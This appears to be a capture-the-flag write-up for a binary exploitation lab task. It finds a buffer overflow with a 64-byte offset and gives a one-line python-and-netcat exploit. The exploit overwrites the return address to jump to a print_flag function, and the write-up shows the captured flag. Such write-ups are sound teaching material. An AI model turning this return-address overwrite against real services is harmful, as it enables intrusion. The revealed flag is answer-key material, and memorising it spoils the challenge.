
# Task-28

the goal is to reverse engineer the binary and try to break the service. <target-ip> 9008

---

Download `Files (materials)`


- Checked the binary start using `file`, `strings`, and `objdump`.
- Found a function `print_flag()` at address `0x401216` that prints the flag.

```bash
./start
Enter your username: admin
Access denied.
```

## Identified Buffer Overflow
- Sent increasing lengths of input and found the binary crashes (segfault).
- Used a cyclic pattern to find the offset where input overwrites the return address.
- Found the offset to be 64 bytes.

## Buffer overflow Exploitation:

```py
python3 -c "print('A'*64 + '\x16\x12\x40\x00\x00\x00\x00\x00')" | nc 10.10.252.185 9008

Enter your username: Welcome, admin!
THM{nice_place_t0_st4rt}
```
- `'A'*64`: Fills the buffer with 64 'A' characters (padding to reach the return address).
- `\x16\x12\x40\x00\x00\x00\x00\x00`: Overwrites the saved return address on the stack with `0x401216` (little-endian format for 64-bit).
- `nc 10.10.252.185 9008`: Sends the payload to the vulnerable service.
